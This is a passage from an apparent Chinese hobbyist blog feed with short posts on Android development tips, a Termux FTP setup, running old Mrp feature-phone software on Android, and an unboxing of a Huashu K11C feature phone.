        <content type="html"><![CDATA[<p>原生的文档应用在MIUI上，桌面图标是被隐藏的，但作为SAF（Storage Access Framework）的一部分，软件还是在手机里面保留着  </p><a id="more"></a>  <p>虽然可以通过创建快捷方式这种软件添加到桌面上，但换手机时不太友好，准备了一个小程序用于启动它  </p><p>可以直接通过包名找到文档程序启动，发现在不手机上（AOSP/GMS）包名不一样，还要多加个判断</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">com</span><span class="selector-class">.android</span><span class="selector-class">.documentui</span></span><br><span class="line"><span class="selector-tag">com</span><span class="selector-class">.google</span><span class="selector-class">.android</span><span class="selector-class">.documentsui</span></span><br></pre></td></tr></table></figure><p>偶然发现可以通过下面方式直接启动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_VIEW);</span><br><span class="line">intent.setType(DocumentsContract.Document.MIME_TYPE_DIR);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>termux启用ftp</title>
      <link href="/2021/termux-qi-yong-ftp/"/>
      <url>/2021/termux-qi-yong-ftp/</url>
      
        <content type="html"><![CDATA[<p>为termux启用ftp，使用ftp操作termux私有目录的文件，为下一部手机免root使用做准备  </p><a id="more"></a>  <p>先安装依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg install busybox termux-services</span><br></pre></td></tr></table></figure><p>通过下面命令更新会话或重新打开termux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> <span class="variable">$PREFIX</span>/etc/profile.d/start-services.sh</span><br></pre></td></tr></table></figure><p>启用ftp服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sv-enable ftpd</span><br><span class="line">sv up ftpd</span><br></pre></td></tr></table></figure><p>可以使用 MT管理器/ES文件浏览器 通过 <code>8021</code> 端口连接到ftp服务</p><p>停止服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sv down ftpd</span><br></pre></td></tr></table></figure><p>可以在 <code>/data/data/com.termux/files/usr/var/service/ftpd/run</code> 看到使用的命令，其中 <code>-w</code> 表示允许读写，不带则只读</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpsvd -vE 0.0.0.0 8021 busybox ftpd -w <span class="variable">$HOME</span></span><br></pre></td></tr></table></figure><p>来源<a href="https://wiki.termux.com/wiki/Remote_Access" target="_blank" rel="noopener">Termux Wiki</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Termux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓无界面主题</title>
      <link href="/2021/an-zhuo-wu-jie-mian-zhu-ti/"/>
      <url>/2021/an-zhuo-wu-jie-mian-zhu-ti/</url>
      
        <content type="html"><![CDATA[<p>当Activity无交互界面时可以用下面主题</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:theme="@android:style/Theme.NoDisplay"</span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"AppThemeTranslucent"</span> <span class="attr">parent</span>=<span class="string">"@style/AppTheme.NoActionBar"</span>&gt;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">"android:windowBackground"</span>&gt;</span>@android:color/transparent<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">"android:windowIsTranslucent"</span>&gt;</span>true<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mrp模拟器 Java版</title>
      <link href="/2021/mrp-mo-ni-qi-java/"/>
      <url>/2021/mrp-mo-ni-qi-java/</url>
      
        <content type="html"><![CDATA[<p>分享一个比较特殊的”模拟器”程序，Mrp作为一个十年前功能机上支持比较多的程序，民间开发者也为它在多个平台制作了模拟器程序  </p><a id="more"></a>  <p>有运行在Android平台的<a href="https://github.com/Yichou/mrpoid2018" target="_blank" rel="noopener">mrpoid</a> | <a href="/2021/zai-an-zhuo-shou-ji-shang-yun-xing-mrp/">安卓看这里</a><br>运行在Symbian平台的冒泡模拟器<br>有运行在MRE平台的<a href="http://ityouyou.com/bbs/View.php?id=5238" target="_blank" rel="noopener">iacMrp</a><br>Win作为mrp的开发平台也有模拟器<br>现在还有可以运行在网页上的<a href="https://vmrp.gddhy.net/" target="_blank" rel="noopener">vmrp</a>  </p><p>今天这个是以前在网上下载的，出处已不可考，从旧功能机里翻出来的，这个是运行在Java平台的模拟器程序，对设备有要求？自行测试<br><img src="/img/preloader.gif" data-original="https://cdn.jsdelivr.net/gh/gddhy/blog-res/mrp-emu-java/pic.jpg" alt="image"></p><p>下载<a href="mrp.jar">Mrp模拟器.jar</a></p><p>此模拟器之前仅在<a href="http://sai.yzjlb.net/t/227.html" target="_blank" rel="noopener">小蟀社区</a>分享过</p>]]></content>
      
      
      
        <tags>
            
            <tag> 旧机博物馆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>适合早期移动设备的网页浏览 wap转码</title>
      <link href="/2021/gua-he-zao-qi-yi-dong-she-bei-de-wang-ye-liu-lan/"/>
      <url>/2021/gua-he-zao-qi-yi-dong-she-bei-de-wang-ye-liu-lan/</url>
      
        <content type="html"><![CDATA[<p>早期的功能机，能运行的WAP浏览器/QQ浏览器功能简单，还不支持https，对于现在的网页基本无法应付，UC浏览器还不错，还支持现在的一些https网页  </p><a id="more"></a>  <p>对于这些早期的设备，可以通过网页转码来实现浏览网页这种基本操作，使用搜狗的网页转码，访问下面这个地址即可查看wap版的本博客<br><a href="http://wap.sogou.com/transcoding/sweb/detail.jsp?g_ut=2&amp;url=https%3A%2F%2Fgddhy.net" target="_blank" rel="noopener">http://wap.sogou.com/transcoding/sweb/detail.jsp?g_ut=2&amp;url=https%3A%2F%2Fgddhy.net</a>  </p><p>每次都手动敲地址也不方便，可以在这里快速使用</p><form onsubmit="return search()" style="box-shadow: 0 0 5px rgba(70,70,40,.255); -webkit-animation: fadeIn 2.5s; animation: fadeIn 2.5s; background-color:  rgba(255,255,255,.0); border-radius: 3px; display: table; vertical-align: middle; width: 80%; height: 20px; max-width: 400px; margin: 10px auto;"><input style="outline: 0; height: 40px; float: right; color: #4a4266; font-size: 18px; font-weight: 500; border: none; background-color: transparent; padding: 0 13px 0 13px" type="submit" id="search_submit" value="打开"><span style="display: block; font-size: 12px; overflow: hidden; padding-left: 2px; vertical-align: middle;"><input style="width: 90%; height: 40px; background-color: transparent; border: none; outline: 0; font-size: 16px; color: #4a4266; padding: 0 10px; border-radius: 50px" type="text" value autocomplete="off" id="search_input" placeholder="✎...   输入网址"></span></form><script type="text/javascript">function search(){if(document.getElementById("search_input").value != ""){window.location.href = "http://wap.sogou.com/transcoding/sweb/detail.jsp?g_ut=2&url=" + document.getElementById("search_input").value;document.getElementById("search_input").value = "";}return false;}</script><script>window.addEventListener('load',function(){if(navigator.userAgent.match(/QQ\//i)) {document.getElementById("search_input").style.display="none";}})</script><p>输入网址时需要包含网站的协议， <code>https://</code> 或 <code>http://</code> ，例如查看哔哩哔哩，输入下面的完整地址</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//www.bilibili.com</span></span><br></pre></td></tr></table></figure><p>想要在现在的智能手机上体验早期的wap版移动网络也可以直接使用转码访问  </p><p>美中不足：智能机访问时网页下方会被搜狗插入广告，十余年前的手机访问时不用担心，那时候浏览器还不支持现在的js/css，所以广告无法显示</p>]]></content>
      
      
      
        <tags>
            
            <tag> 旧机博物馆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网盘程序 FODI</title>
      <link href="/2021/wang-pan-cheng-xu-fodi/"/>
      <url>/2021/wang-pan-cheng-xu-fodi/</url>
      
        <content type="html"><![CDATA[<p>最近发现的一个免服务器部署的OneDrive列表程序（后知后觉<img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="受虐滑稽">）  </p><a id="more"></a>  <p>之前是用的<a href="https://github.com/donwa/oneindex" target="_blank" rel="noopener">oneindex</a> ，后来白嫖的服务器到期了就一直没管过，FODI的好处就是可以无服务器部署  </p><p>FODI可以部署到Cloudflare Workers来免费使用，正好我自己的域名也是用的Cloudflare 来解析的，正好弄到一起，后续管理也方便</p><p>部署方法我这里就不写了，开发者那边写的很详细，可以直接过去看   </p><p><a href="https://logi.im/back-end/fodi-on-cloudflare.html" target="_blank" rel="noopener">在 Cloudflare 部署 FODI 后端 - LOGI</a>  ，也可以参考这个<a href="https://www.sitstars.com/archives/77/" target="_blank" rel="noopener">一个可部署到cf worker的onedrive列表程序</a>  </p><p><a href="https://logi.im/fodi/get-code/" target="_blank" rel="noopener">程序后端代码获取</a> | <a href="https://github.com/vcheckzen/FODI/blob/master/front-end/index.html" target="_blank" rel="noopener">前端代码获取</a>  </p><p><a href="https://www.andressevilla.com/how-to-setup-cloudflare-workers-on-a-custom-domain/" target="_blank" rel="noopener">Cloudflare Workers使用自定义域名的方法</a></p><p>我用这个部署到网盘程序：<a href="https://pan.gddhy.net" target="_blank" rel="noopener">回忆的文件站</a></p><hr><p>另附一个oneindex的程序，上面那个仓库删了，可以在这里<a href="oneindex-master.zip">获取程序</a>，需要php环境安装，里面有 README 可以查看参考<br>附一份oneindex的搭建指南 <a href="https://zhuanlan.zhihu.com/p/120332630" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/120332630</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>在安卓手机上运行mrp</title>
      <link href="/2021/zai-an-zhuo-shou-ji-shang-yun-xing-mrp/"/>
      <url>/2021/zai-an-zhuo-shou-ji-shang-yun-xing-mrp/</url>
      
        <content type="html"><![CDATA[<p>因为斯凯服务器已关闭，mrp已无法正常联网下载，mrp游戏所需的额外资源也无法联网获取，这里有一份准备好的mrp资源包可供使用  </p><a id="more"></a>  <p>mrp资源包里收集了近2000个mrp程序和对应资源，释放即可使用，已替换付费插件/令牌支付插件，可以放心使用，不放心可以自行拦截相关权限或开启飞行模式</p><h4 id="资源包使用"><a href="#资源包使用" class="headerlink" title="资源包使用"></a>资源包使用</h4><p>首先先下载安装 <code>mrp资源包.apk</code> （下面会提供下载方式），安装打开，允许授予储存空间权限，如果使用 <code>小蟀mrp</code> 和 <code>mrpoid2</code> 无需使用自定义目录，进入软件后直接释放资源就行  </p><p>运行软件时先授权<br><img src="/img/preloader.gif" data-original="https://cdn.jsdelivr.net/gh/gddhy/blog-res/android-mrp/Screenshot_20210415-074200.jpg" alt="image">  </p><p>直接点击释放资源就行<br><img src="/img/preloader.gif" data-original="https://cdn.jsdelivr.net/gh/gddhy/blog-res/android-mrp/Screenshot_20210415-074223.jpg" alt="image"></p><p>安装运行 <code>小蟀mrp</code> ，点击 <code>本地应用</code> 找到 <code>app240320</code> 或 <code>qqlist8240320</code> ，点开即可选择想要运行的mrp<br><img src="/img/preloader.gif" data-original="https://cdn.jsdelivr.net/gh/gddhy/blog-res/android-mrp/Screenshot_20210415-074648.jpg" alt="image"></p><p>这个设置界面首次运行某个mrp时会显示，无特殊要求保持默认，直接选择启动就行<br><img src="/img/preloader.gif" data-original="https://cdn.jsdelivr.net/gh/gddhy/blog-res/android-mrp/Screenshot_20210415-074718.jpg" alt="image"></p><p>其他模拟器选择 <code>mrpoid2</code> ，mrpoid2自带一个在线mrp商店，使用时打开 <code>侧滑栏</code> ，选择 <code>我的应用</code> ，再去本地应用里找，和上面 <code>小蟀mrp</code> 使用方法一样<br><img src="/img/preloader.gif" data-original="https://cdn.jsdelivr.net/gh/gddhy/blog-res/android-mrp/Screenshot_20210415-074813.jpg" alt="image"> </p><p>其他模拟器选择 <code>iacMrp</code> ，iacMrp的默认目录和上面两个不太一样，释放资源时 <code>勾选自定义目录</code> ，手动输入 <code>mythroad/240x320</code> ，再释放资源即可，注意 <code>x</code> 是小写英语字母x  </p><p>可以直接在此复制，避免输错</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mythroad/<span class="number">240</span>x320</span><br></pre></td></tr></table></figure><p><img src="/img/preloader.gif" data-original="https://cdn.jsdelivr.net/gh/gddhy/blog-res/android-mrp/Screenshot_20210415-074934.jpg" alt="image"></p><p>iacMrp默认启动冒泡曲奇，运行时选择下载管理<br><img src="/img/preloader.gif" data-original="https://cdn.jsdelivr.net/gh/gddhy/blog-res/android-mrp/Screenshot_20210415-075421.jpg" alt="image"></p><p>在下载管理里可以看到资源包里的mrp<br><img src="/img/preloader.gif" data-original="https://cdn.jsdelivr.net/gh/gddhy/blog-res/android-mrp/Screenshot_20210415-075426.jpg" alt="image"></p><h4 id="资源包获取"><a href="#资源包获取" class="headerlink" title="资源包获取"></a>资源包获取</h4><p>网盘下载: <a href="https://pan.baidu.com/s/1zEGfma2Z86PNbU6bYnVmaA" target="_blank" rel="noopener">https://pan.baidu.com/s/1zEGfma2Z86PNbU6bYnVmaA</a> 提取码:2f0o<br>QQ群获取: 1035494515 <a href="https://jq.qq.com/?_wv=1027&k=5V3XxqTI" target="_blank" rel="noopener">小蟀社区交流</a><br>直接下载: <a href="https://pan.gddhy.net/mrp/Mrp%E8%B5%84%E6%BA%90%E5%8C%85v2.apk" target="_blank" rel="noopener">点击下载</a>  </p><h4 id="模拟器下载"><a href="#模拟器下载" class="headerlink" title="模拟器下载"></a>模拟器下载</h4><p>小蟀mrp: <a href="https://res.gddhy.net/android-mrp/saimrp.apk" target="_blank" rel="noopener">点击下载</a><br>mrpoid2: <a href="https://res.gddhy.net/android-mrp/mrpoid2.apk" target="_blank" rel="noopener">点击下载</a><br>iacMrp: <a href="https://www.coolapk.com/game/com.dabai.iacmrp" target="_blank" rel="noopener">酷安下载</a><br>模拟器也可以前往上面QQ群获取</p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>全部文件: <a href="https://pan.gddhy.net/mrp" target="_blank" rel="noopener">文件下载</a><br>永硕网盘: <a href="http://sohehe4.ys168.com" target="_blank" rel="noopener">斯凯Mrp软件</a><br>在线mrp商店: <a href="http://mrp.jysafe.cn/" target="_blank" rel="noopener">MRP下载中心</a><br>其他模拟器: <a href="https://vmrp.gddhy.net" target="_blank" rel="noopener">vmrp 网页版mrp模拟器</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 旧机博物馆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓通过URI分享文件</title>
      <link href="/2021/an-zhuo-tong-guo-uri-fen-xiang-wen-jian/"/>
      <url>/2021/an-zhuo-tong-guo-uri-fen-xiang-wen-jian/</url>
      
        <content type="html"><![CDATA[<p>之前按照华为开发者文档里的分享文件试过这个，但是接收方一直无法拿到文件，找到了其他解决方法，用后可行  </p><a id="more"></a>  <p>华为提供的方法是这个，原因未知，接收的软件拿不到文件  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.setDataAndType(fileUri,getContentResolver().getType(fileUri));</span><br></pre></td></tr></table></figure><p>找到下面解决方法，可以接收方能拿到文件  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intent.setType(getContentResolver().getType(uri));</span><br><span class="line">intent.putExtra(Intent.EXTRA_STREAM,uri);</span><br></pre></td></tr></table></figure><p>下面贴代码<br>manifest中注册  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:name</span>=<span class="string">"androidx.core.content.FileProvider"</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:authorities</span>=<span class="string">"$&#123;applicationId&#125;.FileProvider"</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:exported</span>=<span class="string">"false"</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:grantUriPermissions</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:name</span>=<span class="string">"android.support.FILE_PROVIDER_PATHS"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:resource</span>=<span class="string">"@xml/file_paths"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure><p>分享文件  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">File file = <span class="keyword">new</span> File(filePath);</span><br><span class="line">Uri uri;</span><br><span class="line"><span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.N) &#123;</span><br><span class="line"> uri = FileProvider.getUriForFile(<span class="keyword">this</span>, getPackageName()+<span class="string">".FileProvider"</span>, file);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> uri = Uri.fromFile(file);</span><br><span class="line">&#125;</span><br><span class="line">Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_SEND);</span><br><span class="line"><span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.N) &#123;</span><br><span class="line"> intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION| Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line">&#125;</span><br><span class="line">intent.setType(getContentResolver().getType(uri));</span><br><span class="line">intent.putExtra(Intent.EXTRA_STREAM,uri);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"> startActivity(Intent.createChooser(intent, <span class="string">"分享"</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"> e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于res/xml/file_paths.xml  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">paths</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">root-path</span> <span class="attr">name</span>=<span class="string">"root"</span> <span class="attr">path</span>=<span class="string">""</span> /&gt;</span> 设备根目录</span><br><span class="line"> <span class="tag">&lt;<span class="name">files-path</span> <span class="attr">name</span>=<span class="string">"files"</span> <span class="attr">path</span>=<span class="string">""</span> /&gt;</span> 应用私有files目录</span><br><span class="line"> <span class="tag">&lt;<span class="name">cache-path</span> <span class="attr">name</span>=<span class="string">"cache"</span> <span class="attr">path</span>=<span class="string">""</span> /&gt;</span> 应用私有cache目录</span><br><span class="line"> <span class="tag">&lt;<span class="name">external-path</span> <span class="attr">name</span>=<span class="string">"external"</span> <span class="attr">path</span>=<span class="string">""</span> /&gt;</span> 内置储存空间根目录</span><br><span class="line"> <span class="tag">&lt;<span class="name">external-files-path</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">path</span>=<span class="string">"path"</span> /&gt;</span> 内置储存空间中的私有files</span><br><span class="line"> <span class="tag">&lt;<span class="name">external-cache-path</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">path</span>=<span class="string">"path"</span> /&gt;</span> 内置储存空间中的私有cache</span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面xml按需添加就行，name对外展示，path为实际目录</p><blockquote><p>参考内容 <a href="https://developer.android.google.cn/training/secure-file-sharing/setup-sharing" target="_blank" rel="noopener">谷歌开发者</a> | <a href="https://developer.huawei.com/consumer/cn/doc/50127" target="_blank" rel="noopener">华为开发者文档</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不一样的开箱 华蜀k11c</title>
      <link href="/2021/bu-yi-yang-de-kai-xiang-hua-shu-k11c/"/>
      <url>/2021/bu-yi-yang-de-kai-xiang-hua-shu-k11c/</url>
      
        <content type="html"><![CDATA[<p>这个话题开箱的手机基本上都是智能机，今天整点不一样的，手机功能机（ <del>山寨机</del> ）华蜀K11C</p><a id="more"></a>  <p>手机闲鱼购入，箱说全，来看看手机包装<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210407_165943.jpg" alt="image"><br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210407_165949.jpg" alt="image"></p><p>打开包装<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210407_170003.jpg" alt="image"></p><p>手机还带一个皮套，可以可以，卖家说近全新，看起来还不错</p><p>手机配件 充电头数据线电池三件套<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210407_170026.jpg" alt="image"></p><p>开个机先，开机后这iOS风格就出来了<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_072519.jpg" alt="image"></p><p>待机界面<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_072525.jpg" alt="image"></p><p>应用程序<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_072532.jpg" alt="image"></p><p>还带个手机电视<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_072539.jpg" alt="image"><br>这里的手机QQ和微信是掌盟平台的，不做展示了，掌盟上的应用都收费</p><p>入手这个手机主要是因为这个手机的MRE平台功能强大（MRE平台是由联发科注资的沃勤公司出的功能机软件平台），去看看手机的系统信息<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_070147.jpg" alt="image">  </p><p>编译时间2015年，这部手机出的够晚的</p><p>来看几个功能机比较常见的应用程序（MRE平台）</p><p>手机QQ和QQ浏览器基本是腾讯给当时功能机的标配，各平台都有一份（掌盟只有QQ没有Q浏）<br>MRE版QQ<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_072613.jpg" alt="image"></p><p>MRE版QQ浏览器<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_072649.jpg" alt="image"></p><p>愤怒的小鸟<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_072737.jpg" alt="image"></p><p>水果忍者<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_072833.jpg" alt="image"></p><p>捕鱼达人<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_073128.jpg" alt="image"></p><p>当年优酷还有心做了个功能机客户端<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_090229.jpg" alt="image"></p><p>新浪微博也有客户端，只能打开首页了<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_090339.jpg" alt="image"></p><p>MRE平台还有模拟器可以运行其他平台软件/游戏</p><p>由大白开发的冒泡模拟器MRE版，可流畅游玩mrp软游<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_095438.jpg" alt="image"></p><p>还有MRE平台的Nes模拟器  </p><p>魂斗罗<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_073228.jpg" alt="image"></p><p>超级玛丽<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_073158.jpg" alt="image"></p><p>如果你不嫌烦的话甚至可以模拟器套娃运行</p><p>手机→MRE版MRP模拟器→MRP版Nes模拟器→Nes游戏<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_100002.jpg" alt="image"><br>套娃模拟有bug，不过效率尚可</p><p>手机的通知栏，MRE程序可以后台运行，可以在通知栏快速管理后台<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_090455.jpg" alt="image"></p><p>拿到这个手机吃惊的是手机自带天线，其他预置移动CMMB手机电视的一般是送天线而不是机身内置，上面那个天线是海信手机送的，插耳机孔即用<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_100836.jpg" alt="image"></p><p>电视是喜闻乐见的雪花屏，中国移动CMMB手机电视业务早已停止运营<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_100853.jpg" alt="image"></p><p>最后，手机聊胜于无的应用商店<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_072709.jpg" alt="image"></p><p>2015年基本上都用上智能机了吧，没多少人会关注个，所以这个大屏幕/大键盘/大音量/手机电视，妥妥的老人机<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/huashu-k11c/MVIMG_20210408_073652.jpg" alt="image"></p><p>后置扬声器块头不小，声音洪亮，最大音量要赶上音箱了，拿它放歌绝对是最靓的仔</p><p>今天开箱就到这里，想看功能机相关的可以去看我之前动态</p><blockquote><p>原帖由博主发布在酷安，同步到博客</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 旧机博物馆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>旧机博物馆 酷比V909</title>
      <link href="/2021/jiu-ji-bo-wu-guan-ku-bi-v909/"/>
      <url>/2021/jiu-ji-bo-wu-guan-ku-bi-v909/</url>
      
